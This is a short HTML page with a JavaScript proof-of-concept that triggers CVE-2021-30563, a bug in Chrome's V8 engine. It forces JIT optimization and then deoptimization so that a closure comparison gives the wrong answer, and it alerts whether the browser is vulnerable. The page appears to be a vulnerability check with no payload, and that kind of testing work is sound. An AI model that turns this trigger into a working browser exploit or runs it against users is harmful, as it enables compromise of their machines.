<p>hello</p>

<script type="text/javascript">
function make() {
    const foo = function(x) {
        var ab = [shClosure];
        if (x > 10) {
            temp[0] = 1;
        }
        return ab[0] === shClosure;
    };
    return foo;
}

// Build the first closure, with function context specialization
make();
// Build and optimize a second closure.
shClosure = make();
temp = [1];

// %PrepareFunctionForOptimization(shClosure);
for(i=0;i<100000;i++){
        shClosure(1);
}
shClosure(1);
// %OptimizeFunctionOnNextCall(shClosure);
for(i=0;i<100000;i++){
        shClosure(2);
}
shClosure(2);

// Build a third closure. This will share the code object with the second closure.
fkClosure = make();
// Return value is evaluated to a constant true;
// print(fkClosure(1));
if(fkClosure(1)){
        // alert("true");
        console.log(true);
}
// Force deopt.
// In the process of translating the native frame to an interpreted one, the JSFunction stack slot is used to represent the closure in question (as part of a captured object).
// Because the code object is shared ab[0] will evaluate to fkClosure instead of shClosure in the following call.
// print(fkClosure(11)); // false
if(!fkClosure(11)){
        alert("CVE-2021-30563 found !");
}
else{
        alert("OK");
}

</script>
